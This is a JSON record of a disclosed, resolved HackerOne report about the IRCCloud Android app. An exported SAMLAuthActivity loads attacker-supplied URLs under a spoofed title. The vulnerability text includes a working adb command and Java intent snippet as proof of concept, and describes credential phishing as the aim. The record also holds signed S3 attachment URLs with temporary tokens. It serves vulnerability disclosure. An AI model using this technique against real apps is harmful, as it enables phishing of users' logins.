@@ -1,0 +1,216 @@
+{
+  "id": 283058,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODMwNTg=",
+  "url": "https://hackerone.com/reports/283058",
+  "title": "[IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-10-26T11:30:14.005Z",
+  "submitted_at": "2017-10-26T11:30:14.005Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bagipro",
+    "url": "/bagipro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 140,
+    "url": "https://hackerone.com/irccloud",
+    "handle": "irccloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "IRCCloud",
+      "twitter_handle": "irccloud",
+      "website": "https://www.irccloud.com",
+      "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-03T11:37:05.224Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-26T17:15:13.597Z",
+  "team_member_agreed_on_going_public_at": "2017-11-03T11:37:05.145Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, I'd like to report a bug which allow to open arbitrary URLs in ```com.irccloud.android.activity.SAMLAuthActivity```\n\nThis activity is exported:\n```xml\n        <activity android:name=\"com.irccloud.android.activity.SAMLAuthActivity\" android:theme=\"@style/dawn\" android:windowSoftInputMode=\"adjustResize\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n            </intent-filter>\n        </activity>\n```\nit means that it can be accessed by any third-party apps installed on the same device. On the newest Androids it also could be exploited by Android Instant Apps directly from a web-browser.\n\nIn file ```  ``` can see that it opens attacker provided URLs\n```java\n        if (getIntent() == null || !getIntent().hasExtra(\"auth_url\")) {\n            finish();\n            return;\n        }\n        getSupportActionBar().setTitle(getIntent().getStringExtra(\"title\"));\n        this.mWebView.loadUrl(getIntent().getStringExtra(\"auth_url\"));\n```\n\nPoC from ADB:\n```\nadb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity -e title \"ATTAAACK\" -e auth_url \"http://google.com/\"\n```\n\nPoC in Java:\n```java\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.SAMLAuthActivity\");\n        intent.putExtra(\"title\", \"ATTAAACK\");\n        intent.putExtra(\"auth_url\", \"http://google.com/\");\n        startActivity(intent);\n```\n\nResult:\n{F233002}\n{F233003}\n\nIt's dangerous because user doesn't see real URL. Attacker can open anything and specify any title (like \"IRCCloud: Login Required\"), and using that trick steal user credentials.\n\nYou can test this issue by yourself, APK is attached",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 233002,
+      "file_name": "2017-10-26_14-17-33.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/002/c14b0581cdbea4e7ac27c626f9638d191c75af07/2017-10-26_14-17-33.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_14-17-33.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_14-17-33.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQCBT5CT2%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061709Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGZrjEWZwbb9piskBn4OeFC4PNJvUp7%2BG4VASQ%2FhxptjAiBwHGWwQaznf%2FM%2BqyVMSiOsdVrQNnE4EFaRSLzd2cagqSqxBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMTNps2gaW8hir3fc6Ko4F7awAc483rFVAMIsJfLviFEoLyTwcOwpOWeGrcBFTJHaFizbGmyGP3wi83fI6cT%2F8d%2FE4ilBEwG4B1lFCt9x8N%2B9J7eXBlc51QVDhs1de7mp%2FYQoXpGnbTJR59qBFb856sjRQ4VtAYvlXX7ary83kfHJOnjA8AvXkjJswVn8nMnPye7G7Du%2BfbXE%2FW6Whv7MpYihVlrMUq6YnGrMcPbB%2BXrzS93x6fiPQ4%2FwipkaFE5tAqdMAM5rhgORrHK9VCvzmMAo9XPSTBkjWVEhNHf5APqFRIejhsd4o193sNKcftekCGYuwiuR2Vvv2zA6BGW2TbqE8ZWg2bjZ10wAQd20%2BSLgBtl7j5WalTaobPMNBb2%2BS8fKo9L37vaouH349rI%2B4h7nQQO7l8tIGJurknRacqsw5TXPDzwaw3QhGm3OZiAgbgeSRgZLHsZTGsS1HAbI33yxyPWwPWFWiiFF1q%2BFVcRoESoH22T5boVSmNJiavteIDAcmwT5D1Rp6Lr7IfV83VowCGeTDeKmg7v9yQH1Kvs4YZr7gqEYyZVr0zT4Ta2HbonZTFJRdpwdn4w8KHdzJBlAsPyXPlc1MFI4zAH7ADhk304UZIZBDbbftOt45QF12rZzm340%2FmK6Pi7aEyXMKdhs8s2TT%2FxM%2Bn5LAyUchLigt9BivB%2BraIvI6ERJmxGjsX6AtOLdbm2dJGEWiusu9Y9IbqqVScUWV77%2BIqHHg1f%2BcblT8wrd38v7uba2jdCx4bpb%2F67f83zUF9LH3c7lNzvTCBCplSb%2BNNPbj9tpxMea1GMC%2FT%2FQRAVrtT1HBug0FJ2VH5iCB7HUQ3jmlOGv8XkxYhk%2BUbeMKkBzq6j5drbn9TRuzloB71PRdhwhVML3Lt9IGOrIBLxWa%2BJoBrazOiw%2BQ3ByT2dhmkFKHCVREMe1IdrsbBLhx4Ghk5WuRvwhVm8wNLmw5L45765clLZHQZcLztb0vOI2mBprUrmFQ8eXKh2JMTaKWdDHdbiO6I4gw%2F0xuCIFeYqf07rikkuQ%2F%2Fj5pH5fqmP5SA73Wphp%2B56y%2F8u5ig3op9XYhtqXC0aiJKODd6z5TvrrI5gwp8Jt3CPmcM5KY1hgjX7shrldkaoLVwB%2BB4Q5C%2BQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0bfe05716bc03c5357f4a6cd700f09535e2d2443f9843bab15d392ef3164e609",
+      "file_size": 177639,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 233003,
+      "file_name": "2017-10-26_14-15-36.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/003/f39c5a4371dbbbcffd6653fa22a59cac5e9b76ed/2017-10-26_14-15-36.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_14-15-36.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_14-15-36.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQCBT5CT2%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061709Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGZrjEWZwbb9piskBn4OeFC4PNJvUp7%2BG4VASQ%2FhxptjAiBwHGWwQaznf%2FM%2BqyVMSiOsdVrQNnE4EFaRSLzd2cagqSqxBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMTNps2gaW8hir3fc6Ko4F7awAc483rFVAMIsJfLviFEoLyTwcOwpOWeGrcBFTJHaFizbGmyGP3wi83fI6cT%2F8d%2FE4ilBEwG4B1lFCt9x8N%2B9J7eXBlc51QVDhs1de7mp%2FYQoXpGnbTJR59qBFb856sjRQ4VtAYvlXX7ary83kfHJOnjA8AvXkjJswVn8nMnPye7G7Du%2BfbXE%2FW6Whv7MpYihVlrMUq6YnGrMcPbB%2BXrzS93x6fiPQ4%2FwipkaFE5tAqdMAM5rhgORrHK9VCvzmMAo9XPSTBkjWVEhNHf5APqFRIejhsd4o193sNKcftekCGYuwiuR2Vvv2zA6BGW2TbqE8ZWg2bjZ10wAQd20%2BSLgBtl7j5WalTaobPMNBb2%2BS8fKo9L37vaouH349rI%2B4h7nQQO7l8tIGJurknRacqsw5TXPDzwaw3QhGm3OZiAgbgeSRgZLHsZTGsS1HAbI33yxyPWwPWFWiiFF1q%2BFVcRoESoH22T5boVSmNJiavteIDAcmwT5D1Rp6Lr7IfV83VowCGeTDeKmg7v9yQH1Kvs4YZr7gqEYyZVr0zT4Ta2HbonZTFJRdpwdn4w8KHdzJBlAsPyXPlc1MFI4zAH7ADhk304UZIZBDbbftOt45QF12rZzm340%2FmK6Pi7aEyXMKdhs8s2TT%2FxM%2Bn5LAyUchLigt9BivB%2BraIvI6ERJmxGjsX6AtOLdbm2dJGEWiusu9Y9IbqqVScUWV77%2BIqHHg1f%2BcblT8wrd38v7uba2jdCx4bpb%2F67f83zUF9LH3c7lNzvTCBCplSb%2BNNPbj9tpxMea1GMC%2FT%2FQRAVrtT1HBug0FJ2VH5iCB7HUQ3jmlOGv8XkxYhk%2BUbeMKkBzq6j5drbn9TRuzloB71PRdhwhVML3Lt9IGOrIBLxWa%2BJoBrazOiw%2BQ3ByT2dhmkFKHCVREMe1IdrsbBLhx4Ghk5WuRvwhVm8wNLmw5L45765clLZHQZcLztb0vOI2mBprUrmFQ8eXKh2JMTaKWdDHdbiO6I4gw%2F0xuCIFeYqf07rikkuQ%2F%2Fj5pH5fqmP5SA73Wphp%2B56y%2F8u5ig3op9XYhtqXC0aiJKODd6z5TvrrI5gwp8Jt3CPmcM5KY1hgjX7shrldkaoLVwB%2BB4Q5C%2BQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed6618b2793f1139021241bc4fae3fca1009eea9327fdcf5e96873bb3d02b402",
+      "file_size": 123936,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 233005,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/005/b4ba8735335f097d539c0fbfcb41f28d7db6a6fd/app-release.apk?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQCBT5CT2%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061709Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGZrjEWZwbb9piskBn4OeFC4PNJvUp7%2BG4VASQ%2FhxptjAiBwHGWwQaznf%2FM%2BqyVMSiOsdVrQNnE4EFaRSLzd2cagqSqxBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMTNps2gaW8hir3fc6Ko4F7awAc483rFVAMIsJfLviFEoLyTwcOwpOWeGrcBFTJHaFizbGmyGP3wi83fI6cT%2F8d%2FE4ilBEwG4B1lFCt9x8N%2B9J7eXBlc51QVDhs1de7mp%2FYQoXpGnbTJR59qBFb856sjRQ4VtAYvlXX7ary83kfHJOnjA8AvXkjJswVn8nMnPye7G7Du%2BfbXE%2FW6Whv7MpYihVlrMUq6YnGrMcPbB%2BXrzS93x6fiPQ4%2FwipkaFE5tAqdMAM5rhgORrHK9VCvzmMAo9XPSTBkjWVEhNHf5APqFRIejhsd4o193sNKcftekCGYuwiuR2Vvv2zA6BGW2TbqE8ZWg2bjZ10wAQd20%2BSLgBtl7j5WalTaobPMNBb2%2BS8fKo9L37vaouH349rI%2B4h7nQQO7l8tIGJurknRacqsw5TXPDzwaw3QhGm3OZiAgbgeSRgZLHsZTGsS1HAbI33yxyPWwPWFWiiFF1q%2BFVcRoESoH22T5boVSmNJiavteIDAcmwT5D1Rp6Lr7IfV83VowCGeTDeKmg7v9yQH1Kvs4YZr7gqEYyZVr0zT4Ta2HbonZTFJRdpwdn4w8KHdzJBlAsPyXPlc1MFI4zAH7ADhk304UZIZBDbbftOt45QF12rZzm340%2FmK6Pi7aEyXMKdhs8s2TT%2FxM%2Bn5LAyUchLigt9BivB%2BraIvI6ERJmxGjsX6AtOLdbm2dJGEWiusu9Y9IbqqVScUWV77%2BIqHHg1f%2BcblT8wrd38v7uba2jdCx4bpb%2F67f83zUF9LH3c7lNzvTCBCplSb%2BNNPbj9tpxMea1GMC%2FT%2FQRAVrtT1HBug0FJ2VH5iCB7HUQ3jmlOGv8XkxYhk%2BUbeMKkBzq6j5drbn9TRuzloB71PRdhwhVML3Lt9IGOrIBLxWa%2BJoBrazOiw%2BQ3ByT2dhmkFKHCVREMe1IdrsbBLhx4Ghk5WuRvwhVm8wNLmw5L45765clLZHQZcLztb0vOI2mBprUrmFQ8eXKh2JMTaKWdDHdbiO6I4gw%2F0xuCIFeYqf07rikkuQ%2F%2Fj5pH5fqmP5SA73Wphp%2B56y%2F8u5ig3op9XYhtqXC0aiJKODd6z5TvrrI5gwp8Jt3CPmcM5KY1hgjX7shrldkaoLVwB%2BB4Q5C%2BQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=44e551e3112c6ab022511ccb48790418a312abb7c636ba0a6571437061168a98",
+      "file_size": 4668832,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-11-25T17:15:13.685Z",
+  "allow_singular_disclosure_after": -271861315.52158475,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "sheikhrishad0",
+    "bughunterninja",
+    "eveeez",
+    "cr4xerbik4sh",
+    "japz",
+    "sumit7",
+    "0xm1racle",
+    "moon_shadow",
+    "kushagrasarathe",
+    "zhoon_noorain",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 271,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.irccloud.android",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "283058",
+  "votes": 16,
+  "latest_disclosable_activity_at": "2017-11-03T11:37:05.537Z",
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:17:09.323449",
+    "source": "https://hackerone.com/reports/283058.json",
+    "report_id": 283058
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODMwNTg=",
+    "databaseId": "283058",
+    "title": "[IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity",
+    "url": "https://hackerone.com/reports/283058",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-11-03T11:37:05.224Z",
+    "created_at": "2017-10-26T11:30:14.005Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "bagipro"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE0MA==",
+      "handle": "irccloud",
+      "name": "IRCCloud",
+      "url": "https://hackerone.com/irccloud",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS82MzQ2Ng==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-10-26T15:11:57.875Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI4MzA1OA==",
+    "_id": "283058",
+    "disclosed": true,
+    "votes": 16,
+    "latest_disclosable_activity_at": "2017-11-03T11:37:05.537Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODMwNTg=",
+      "databaseId": "283058",
+      "title": "[IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity",
+      "url": "https://hackerone.com/reports/283058",
+      "disclosed_at": "2017-11-03T11:37:05.224Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE0MA==",
+      "handle": "irccloud",
+      "name": "IRCCloud",
+      "url": "https://hackerone.com/irccloud",
+      "currency": "usd"
+    }
+  }
+}
